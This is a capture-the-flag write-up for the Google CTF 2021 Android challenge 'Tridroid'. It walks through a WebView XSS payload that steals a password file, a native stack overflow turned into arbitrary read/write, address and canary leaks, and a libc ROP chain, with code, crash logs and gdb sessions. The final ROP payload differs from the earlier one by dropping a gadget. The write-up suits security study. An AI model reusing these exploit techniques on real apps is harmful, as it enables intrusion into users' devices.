
# Tridroid - Google CTF 2021 Quals Writeup

Decompiling apk with jadx will shows us some insights,
```java
    /* access modifiers changed from: protected */
    @Override // androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
        this.textView = (TextView) findViewById(R.id.textView);
        this.editText = (EditText) findViewById(R.id.editText);
        this.webView = (WebView) findViewById(R.id.webView);
        generateSecretKey();
        createPasswordFile();
        this.editText.addTextChangedListener(new TextWatcher() {
            /* class com.google.ctf.pwn.tridroid.MainActivity.AnonymousClass1 */

            public void beforeTextChanged(CharSequence charSequence, int i, int i2, int i3) {
            }

            public void onTextChanged(CharSequence charSequence, int i, int i2, int i3) {
            }

            public void afterTextChanged(Editable editable) {
                MainActivity.this.webView.postWebMessage(new WebMessage(MainActivity.this.editText.getText().toString()), Uri.parse("*"));
            }
        });
        this.broadcastReceiver = new BroadcastReceiver() {
            /* class com.google.ctf.pwn.tridroid.MainActivity.AnonymousClass2 */

            public void onReceive(Context context, Intent intent) {
                if (intent.getAction().equals(MainActivity.SET_NAME_INTENT)) {
                    MainActivity.this.editText.setText(new String(Base64.getDecoder().decode(intent.getStringExtra("data")), StandardCharsets.UTF_8));
                } else if (intent.getAction().equals(MainActivity.SET_FLAG_INTENT)) {
                    MainActivity.this.flag = new String(Base64.getDecoder().decode(intent.getStringExtra("data").trim()), StandardCharsets.UTF_8).trim();
                }
            }
        };
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(SET_NAME_INTENT);
        intentFilter.addAction(SET_FLAG_INTENT);
        registerReceiver(this.broadcastReceiver, intentFilter);
        this.webView.getSettings().setJavaScriptEnabled(true);
        this.webView.getSettings().setAllowFileAccess(true);
        this.webView.getSettings().setAllowFileAccessFromFileURLs(true);
        this.webView.getSettings().setCacheMode(2);
        this.webView.setWebViewClient(new WebViewClient());
        this.webView.setWebChromeClient(new WebChromeClient());
        this.webView.addJavascriptInterface(this, "bridge");
        this.webView.loadUrl("file:///android_asset/index.html");
    }
```
App immediately render index.html from assets/ directory with WebView. This will also open two broadcast receiver intent, SET_FLAG to set this.flag content and SET_NAME to our input and pass it to WebView. Here's the content of index.html
```html
<html>
<body>
<div>
</div>
<script>
    onmessage = function(event) {
        document.getElementsByTagName('div')[0].innerHTML = `Hi ${event.data}, how you doing?`;
    }
</script>
</body>
</html>
```
Upon seeing that we could directly see that we can get XSS from it, but where to go from XSS? If we go back to MainActivity.java again, we could see the app also register a JavascriptInterface with bridge as object name to interact with java part of code,
```java
	public void onCreate(Bundle bundle) {
		...
		this.webView.addJavascriptInterface(this, "bridge");
		...
	}

    @JavascriptInterface
    public String manageStack(String str, String str2, String str3) {
        try {
            FileInputStream openFileInput = getApplication().openFileInput("password.txt");
            try {
                if (str.equals(new BufferedReader(new InputStreamReader(openFileInput)).readLine())) {
                    String hex = hex(manageStack(str2, unhex(str3)));
                    if (openFileInput != null) {
                        openFileInput.close();
                    }
                    return hex;
                } else if (openFileInput == null) {
                    return "";
                } else {
                    openFileInput.close();
                    return "";
                }
            } catch (Throwable th) {
                th.addSuppressed(th);
            }
            throw th;
        } catch (Exception e) {
            Log.e("gCTF", "Reading password file has failed ...", e);
            return "";
        }
    }
```

We can use  `bridge.manageStack` but we need password to use it. Every time app launched, it will also drop a random UUID to password.txt located at `/data/data/com.google.ctf.tridroid/files/password.txt`. 
```java
	public void onCreate(Bundle bundle) {
		...
		createPasswordFile();
		...
		this.webView.getSettings().setAllowFileAccess(true);
		this.webView.getSettings().setAllowFileAccessFromFileURLs(true);		
		...
	}

    private void createPasswordFile() {
        try {
            FileOutputStream openFileOutput = getApplication().openFileOutput("password.txt", 0);
            try {
                openFileOutput.write(UUID.randomUUID().toString().getBytes(StandardCharsets.UTF_8));
                if (openFileOutput != null) {
                    openFileOutput.close();
                    return;
                }
                return;
            } catch (Throwable th) {
                th.addSuppressed(th);
            }
            throw th;
        } catch (Exception e) {
            Log.e("TriDroid", "Generating password file has failed ...", e);
        }
    }
```

This is where our XSS can come in handy to read the password. Here's our initial payload, we can use `file://` scheme because it's explicitly allowed when setting up the webview,
```html
<iframe name=x src=file:///data/data/com.google.ctf.pwn.tridroid/files/password.txt onload='var password=top.x.document.body.innerHTML.match(/\b[0-9a-f]{8}\b-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-\b[0-9a-f]{12}\b/)[0];'></iframe>
```
Use iframe to load password file and the content of the password is available through `top.x.document.body`. Of course, getting the password is just one of the very first few of steps. If we take a look back at manageStack again, it calls a native function with the second param converted to byteArray first from a hex string.

```java
public native byte[] manageStack(String str, byte[] bArr);
...
		String hex = hex(manageStack(str2, unhex(str3)));
```
This is Binary Ninja decompilation output of the native function

![binja decompile](https://files.catbox.moe/kh6f75.png)

We have 4 mode to operate with the stack, `push DATA`, `pop`, `top`, and `modify DATA`. We also spotted some easy buffer overflow bug in almost every of those operations function because of no bound check when data copied from byte array to target buffer.

![push_element](https://files.catbox.moe/8q21ok.png)

![modifypush_element](https://files.catbox.moe/0wkxzx.png)

We have our data size 16 bytes and the next stack top pointer is placed next to it. We can turn this into arbitrary read/write easily with this step,

1. Use `modify` to edit stack top data to overwrite next top pointer to target address,
2. `pop` stack top so that our target address became the next stack top
3. We can use `modify` to edit or use `top` to leak the data
4. `push` something again to restore our stack

Or visualized,

![visual](https://files.catbox.moe/vlo9xe.jpg)

Here's the updated piece of our code that will run inside our `onload` event from iframe.
```js
function stack_push(s) {
    return bridge.manageStack(password, "push", s);
}

function stack_pop() {
    return bridge.manageStack(password, "pop", "00");
}

function stack_top() {
    return bridge.manageStack(password, "top", "00");
}

function stack_edit(s) {
    return bridge.manageStack(password, "modify", s);
}

function u64(s) {
    let n = 0n;
    for (let i = 0; i < s.length && i < 16; i += 2) {
        n += BigInt(parseInt(s.substr(i, 2), 16)) << BigInt(i * 4);
    }
    return n;
}

function p64(n) {
    let s = "";
    while (n) {
        s += (n & 0xFFn).toString(16).padStart(2, "0");
        n >>= 8n;
    }
    return  s + "0".repeat(16 - s.length);
}

stack_push("41414141414141414141414141414141");
stack_push("41414141414141414141414141414141"); // initial top

function read(addr) {
    stack_edit("41414141414141414141414141414141" + p64(addr));
    stack_pop();
    let leak = stack_top();
    stack_push("41414141414141414141414141414141");
    return leak;
}

function write(addr, data) {
    stack_edit("41414141414141414141414141414141" + p64(addr));
    stack_pop();
    stack_edit(data);
    stack_push("41414141414141414141414141414141");
}
```

Before using the arbitrary r/w, we need a leak first. We can use `modify` and `top` to leak some data from the stack because of `strcpy` copying data from stack directly to stack_top data in `modify_element`.

![modify leak](https://files.catbox.moe/doq9or.png)

So what we need to do is fill `var_38` until it reach just before canary.
```
[ var_38 (0x28 bytes) ][ canary ][ saved rbp ][ saved rip ]
```
By doing that, we can get canary, rbp and, libtridroid address leaked because `strcpy` copied past our buffer. We can also do the same to get heap leak by filling 16 bytes of data. There's some catch to this though, since our stack data is too small (only 16 bytes) there's a chance we are overwriting some important data on the heap. To get around it, we can use arb r/w primitive to make our stack top use unused heap region. Here's updated code to get all the leak including libc leak from strcpy GOT table in libtridroid.
```js
stack_push("41414141414141414141414141414141"); // fill 16 bytes of stack data
var leak = stack_top();
var heap = u64(leak.slice(32));
var heap_n = u64(leak.slice(32)) & ~0xFFFn;
console.log("heap", "0x" + heap.toString(16));
console.log("heap_base", "0x" + heap_n.toString(16));

write(heap_n+0x3020n, "41".repeat(0x20))
write(heap_n+0x3040n, "41".repeat(0x8))
leak = read(heap_n+0x3020n);
var lib_base = u64(leak.substr(0x28 * 2, 12)) - 0x16ffn;
console.log("lib", "0x" + lib_base.toString(16));
write(heap_n+0x3020n, "41".repeat(0x28))
leak = read(heap_n+0x3020n);
var canary = leak.substr(0x28 * 2, 16);
console.log("canary", canary);
var stack = u64(leak.substr(0x30 * 2, 12));
console.log("stack", "0x" + stack.toString(16));
leak = read(lib_base + 0x2fa8n); // strcpy GOT
var strcpy = u64(leak);
var libc_base = strcpy - 0x53830n;
console.log("libc", "0x" + libc_base.toString(16));
```
We have all the thing required to ROP, but where to? If we take a look back at MainActivity, we have a showFlag method that will print encrypted base64 flag to android log.
```java
    public void showFlag() {
        try {
            Cipher instance = Cipher.getInstance("AES/CBC/PKCS5PADDING");
            instance.init(1, this.secretKey, new IvParameterSpec(new byte[16]));
            Log.d("TriDroid", "Flag: " + new String(Base64.getEncoder().encode(instance.doFinal(this.flag.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8));
        } catch (Exception e) {
            Log.e("TriDroid", "Showing flag has failed ...", e);
        }
    }
```
and in server.py, remote service will only show us the logcat content of TriDroid, 
```py
def adb_logs():
    logs = adb(["logcat", "-d", "-s", "TriDroid"], True)
    for log in logs.decode("utf-8").strip().split("\n"):
        print_to_user(log)
...
print_to_user("Please enter your name encoded in base64:")

name = sys.stdin.readline().strip()
adb_broadcast("com.google.ctf.pwn.tridroid.SET_NAME", extras = {
    "data": name
})

print_to_user("Thank you! Check out the logs. This may take a while ...\n")

time.sleep(EXPLOIT_TIME_SECS)

adb_logs()

emulator.kill()
```
So, in summary we need to call java showFlag method in MainActivity to get the flag. Luckily, we have invokeJavaMethod helper function in libtridroid.

![invokeJavaMethod](https://files.catbox.moe/kxzzu9.png)

We still need to get jnienv and jobject pointers. This is where frida our arb r/w can come in handy. First, we can add a hook to `Java_com_google_ctf_pwn_tridroid_MainActivity_manageStack__Ljava_lang_String_2_3B` and log jnienv and jobj ptr.
```js
Interceptor.attach(Module.getExportByName('libtridroid.so', 'Java_com_google_ctf_pwn_tridroid_MainActivity_manageStack__Ljava_lang_String_2_3B'), {
    onEnter(args) {
        console.log("jnienv", args[0]);
        console.log("jobj", args[1]);
    },
});
```
Then we can use arb read to read stack content and find jnienv and jobj ptr.
```js
for (let i = -0x1000; i < 0x1000; i += 8) {
	console.log(read(stack + BigInt(i));
}
```
After some logcat and frida session, we have -0x60 and -0x68 as offset from stack leak to JNIEnv and jobject pointer location on stack. All we need to do now is just craft the ROP. Since libtridroid doesn't have any useful gadgets, we can use libc to get some useful gadgets.
```js
leak = read(stack - 0x60n);
var JNIEnv = u64(leak);
console.log("JNIEnv", "0x" + JNIEnv.toString(16));
leak = read(stack - 0x68n);
var jobj = u64(leak);
console.log("jobj", "0x" + jobj.toString(16));

write(heap_n + 0x3070n, "73686f77466c616700") // showFlag
write(heap_n + 0x3080n, "28295600") // ()V

// 0x0000000000042c92: pop rdi; ret;
// 0x0000000000042d38: pop rsi; ret;
// 0x0000000000046175: pop rdx; r2et;
// 0x0000000000042e58: pop rcx; ret;
// 0x0000000000045e13: pop rax; ret;
var L_pop_rdi = libc_base + 0x42c92n;
var L_pop_rsi = libc_base + 0x42d38n;
var L_pop_rdx = libc_base + 0x46175n;
var L_pop_rcx = libc_base + 0x42e58n;

var payload = "00".repeat(0x28);
payload += canary
payload += p64(stack)
payload += p64(L_pop_rdi) // rop begin
payload += p64(JNIEnv)
payload += p64(L_pop_rsi)
payload += p64(jobj)
payload += p64(L_pop_rdx)
payload += p64(heap_n + 0x3070n)
payload += p64(L_pop_rcx)
payload += p64(heap_n + 0x3080n)
payload += p64(lib_base + 0xfa0n)
write(heap_n+0x2120n, payload) // modify_element bof
```
That's it and after running that we got a crash immediately.
```
07-18 23:31:46.319 13848 13848 I chromium: [INFO:CONSOLE(46)] "heap 0x7fd461fea970", source:  (46)
07-18 23:31:46.319 13848 13848 I chromium: [INFO:CONSOLE(47)] "heap_base 0x7fd461fea000", source:  (47)
07-18 23:31:46.330 13848 13848 I chromium: [INFO:CONSOLE(70)] "lib 0x7fd3e9d4e000", source:  (70)
07-18 23:31:46.339 13848 13848 I chromium: [INFO:CONSOLE(74)] "canary a60b291c6d9dcf40", source:  (74)
07-18 23:31:46.339 13848 13848 I chromium: [INFO:CONSOLE(76)] "stack 0x7fd3e5ec4c30", source:  (76)
07-18 23:31:46.342 13848 13848 I chromium: [INFO:CONSOLE(79)] "JNIEnv 0x7fd501f7a0f0", source:  (79)
07-18 23:31:46.345 13848 13848 I chromium: [INFO:CONSOLE(82)] "jobj 0x7fd3e5ec4c54", source:  (82)
07-18 23:31:46.356 13848 13848 I chromium: [INFO:CONSOLE(90)] "libc 0x7fd6d2095000", source:  (90)
...
07-18 23:31:46.431 13946 13946 F DEBUG   : Build fingerprint: 'google/sdk_gphone_x86_64_arm64/generic_x86_64_arm64:11/RSR1.201211.001.A1/7054069:userdebug/dev-keys'
07-18 23:31:46.431 13946 13946 F DEBUG   : Revision: '0'
07-18 23:31:46.431 13946 13946 F DEBUG   : ABI: 'x86_64'
07-18 23:31:46.431 13946 13946 F DEBUG   : Timestamp: 2021-07-18 23:31:46+0700
07-18 23:31:46.431 13946 13946 F DEBUG   : pid: 13848, tid: 13942, name: JavaBridge  >>> com.google.ctf.pwn.tridroid <<<
07-18 23:31:46.431 13946 13946 F DEBUG   : uid: 10154
07-18 23:31:46.431 13946 13946 F DEBUG   : signal 11 (SIGSEGV), code -6 (SI_TKILL), fault addr --------
07-18 23:31:46.431 13946 13946 F DEBUG   :     rax 40cf9d6d1c290b01  rbx 00007fd3ea34faba  rcx 40cf9d6d1c290ba6  rdx 00007fd461fec060
07-18 23:31:46.431 13946 13946 F DEBUG   :     r8  00007fd3e5ec4b80  r9  00007fd4c203eb60  r10 0000000000000003  r11 00007fd6d20b5d64
07-18 23:31:46.431 13946 13946 F DEBUG   :     r12 00007fd501f7a0f0  r13 00007fd3e5ec4d10  r14 00007fd3e5ec4c54  r15 00007fd441801171
07-18 23:31:46.431 13946 13946 F DEBUG   :     rdi 00007fd441801171  rsi 00007fd3e5ec4c54
07-18 23:31:46.431 13946 13946 F DEBUG   :     rbp 00007fd3e5ec4b38  rsp 00007fd3e5ec4a78  rip 00007fd441b49f5c
07-18 23:31:46.434 13946 13946 F DEBUG   : backtrace:
07-18 23:31:46.434 13946 13946 F DEBUG   :       #00 pc 0000000000400f5c  /apex/com.android.art/lib64/libart.so (art::(anonymous namespace)::CheckJNI::GetObjectClass(_JNIEnv*, _jobject*)+60) (BuildId: 7fbaf2a1a3317bd634b00eb90e32291e)
07-18 23:31:46.434 13946 13946 F DEBUG   :       #01 pc 0000000000001026  /data/app/~~QjnUt2yMxnIHaDxEzARg1A==/com.google.ctf.pwn.tridroid-ZQ4iAOdeRcHj4_SOjHAghQ==/base.apk!libtridroid.so (offset 0x3a1000) (_JNIEnv::GetObjectClass(_jobject*)+38) (BuildId: 11cc48f3bf4883b88944d5a6b36621678289107e)
07-18 23:31:46.434 13946 13946 F DEBUG   :       #02 pc 0000000000000fc4  /data/app/~~QjnUt2yMxnIHaDxEzARg1A==/com.google.ctf.pwn.tridroid-ZQ4iAOdeRcHj4_SOjHAghQ==/base.apk!libtridroid.so (offset 0x3a1000) (invokeJavaMethod(_JNIEnv*, _jobject*, char const*, char const*)+36) (BuildId: 11cc48f3bf4883b88944d5a6b36621678289107e)
```
from the backtrace we hit the invokeJavaMethod function correctly and the leaks also seems OK-ish. only one way to find out is by using gdb. Using the shipped gdbserver64 on android immediately crash the gdb session, so I pushed prebuilt gdbserver binary from `$NDK_ROOT/prebuilt/android-x86_64/gdbserver/gdbserver` to android, attach it to the app, and forward tcp with adb.
```
$ adb push $NDK_ROOT/prebuilt/android-x86_64/gdbserver/gdbserver /data/local/tmp/
$ adb forward tcp:1234 tcp:1234
$ adb shell
$ /data/local/tmp/gdbsever :1234 --attach `pidof com.google.ctf.pwn.tridroid`
```
Then inside gdb attach to the forwarded gdbserver port and run the exploit again
```
(gdb) target remote localhost:1234
(gdb) c
...
```
We immediately hit the SEGV and we can inspect it on gdb.
```
Thread 38 "JavaBridge" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 4389.4588]
0x00007727964cbf5c in art::(anonymous namespace)::CheckJNI::GetObjectClass(_JNIEnv*, _jobject*)
    () from target:/apex/com.android.art/lib64/libart.so
(gdb) x/i $pc
=> 0x7727964cbf5c <_ZN3art12_GLOBAL__N_18CheckJNI14GetObjectClassEP7_JNIEnvP8_jobject+60>:
    movaps %xmm0,0x50(%rsp)
(gdb) i r rsp
rsp            0x77273dac9a78      0x77273dac9a78
```
`movaps` requires a 0x10 bytes aligned rsp so that's why it trigger a SEGV. To fix that, all we need to do is just add one ret gadget just before calling the function to fix the stack alignment. Here's the final rop payload,
```js
// 0x0000000000042c92: pop rdi; ret;
// 0x0000000000042d38: pop rsi; ret;
// 0x0000000000046175: pop rdx; r2et;
// 0x0000000000042e58: pop rcx; ret;
// 0x0000000000045e13: pop rax; ret;
var L_pop_rdi = libc_base + 0x42c92n;
var L_pop_rsi = libc_base + 0x42d38n;
var L_pop_rdx = libc_base + 0x46175n;
var L_pop_rcx = libc_base + 0x42e58n;

var payload = "00".repeat(0x28);
payload += canary
payload += p64(stack)
payload += p64(L_pop_rdi) // rop begin
payload += p64(JNIEnv)
payload += p64(jobj)
payload += p64(L_pop_rdx)
payload += p64(heap_n + 0x3070n)
payload += p64(L_pop_rcx)
payload += p64(heap_n + 0x3080n)
payload += p64(L_pop_rdi + 1n) // stack alignment
payload += p64(lib_base + 0xfa0n)
write(heap_n+0x2120n, payload) // modify_element bof
```

Send the final payload and wait for the encrypted flag appears on the log. Write a decryptor for it. I used online compiler for this one, https://ideone.com/OBul4E.

### Notes
Final payloads are in solve.html, solve.js, and solve.py (to easily interact with challenge remotely and locally). hook.js are used to for frida hook.
